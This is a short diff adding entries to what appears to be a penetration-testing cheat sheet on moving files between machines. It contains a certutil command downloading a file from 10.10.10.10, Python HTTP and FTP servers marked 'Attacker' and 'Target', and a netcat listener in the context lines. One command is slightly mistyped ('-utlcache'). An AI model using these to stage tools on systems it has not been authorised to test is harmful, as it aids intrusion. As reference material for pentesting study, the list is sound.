@@ -388,6 +388,37 @@ nc -lvp 1234 > nmap
 </details>
 
 <details>
+<summary>Certutil</summary>
+
+```bash
+certutil.exe -utlcache -f http://10.10.10.10/file.txt file.txt
+```
+</details>
+
+<details>
+<summary>HTTP Server</summary>
+
+```bash
+Python -m http.server 8000
+
+#choose your NIC
+python -m http.server 8000 --bind 192.168.1.100
+```
+</details>
+
+<details>
+<summary>FTP</summary>
+    
+```bash
+# Attacker
+python -m pyftpdlib 21
+
+# Target
+ftp 10.10.10.10
+```
+</details>
+
+<details>
 <summary>Downloading With Terminal</summary></br>
 Windows
 
